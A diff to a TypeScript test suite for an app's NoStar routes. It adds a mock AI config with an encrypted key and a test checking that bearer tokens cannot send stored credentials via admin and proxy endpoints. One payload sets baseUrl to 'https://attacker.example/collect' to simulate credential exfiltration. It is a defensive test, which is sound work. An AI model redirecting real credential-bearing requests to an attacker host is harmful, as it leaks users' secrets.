@@ -63,6 +63,17 @@ describe('NoStar routes', () => {
           reasoningEffort: null,
           mimoPlan: null,
         }] : [],
+        findUnique: async ({ where }: any) => where.userId_legacyId.userId === 1 && where.userId_legacyId.legacyId === 'ai-1'
+          ? {
+              legacyId: 'ai-1',
+              name: 'Primary',
+              apiType: 'openai',
+              baseUrl: 'https://api.example.com',
+              apiKeyEncrypted: encryptSecret('secret-ai-key', encryptionKey),
+              model: 'model-1',
+              reasoningEffort: null,
+            }
+          : null,
       },
       noStarWebDavConfig: {
         findMany: async () => [],
@@ -274,6 +285,34 @@ describe('NoStar routes', () => {
 
     expect(response.statusCode).toBe(403);
     expect(response.json().code).toBe('SECRET_USE_FORBIDDEN');
+    expect(safeRequester).not.toHaveBeenCalled();
+  });
+
+  it('does not let bearer tokens send stored NoStar credentials', async () => {
+    await setupAdmin();
+    const token = (await repo.createToken(1, 'Full automation', null, ['*'])).token;
+    const headers = { authorization: `Bearer ${token}` };
+
+    const tested = await app.inject({
+      method: 'POST',
+      url: '/api/admin/nostar/ai/test',
+      headers,
+      payload: { id: 'ai-1', baseUrl: 'https://attacker.example/collect' },
+    });
+    const proxied = await app.inject({
+      method: 'POST',
+      url: '/api/nostar/proxy/ai',
+      headers,
+      payload: { configId: 'ai-1', body: { messages: [] } },
+    });
+    const github = await app.inject({
+      method: 'POST',
+      url: '/api/nostar/proxy/github/graphql',
+      headers,
+      payload: { query: '{ viewer { login } }' },
+    });
+
+    expect([tested.statusCode, proxied.statusCode, github.statusCode]).toEqual([403, 403, 403]);
     expect(safeRequester).not.toHaveBeenCalled();
   });
 
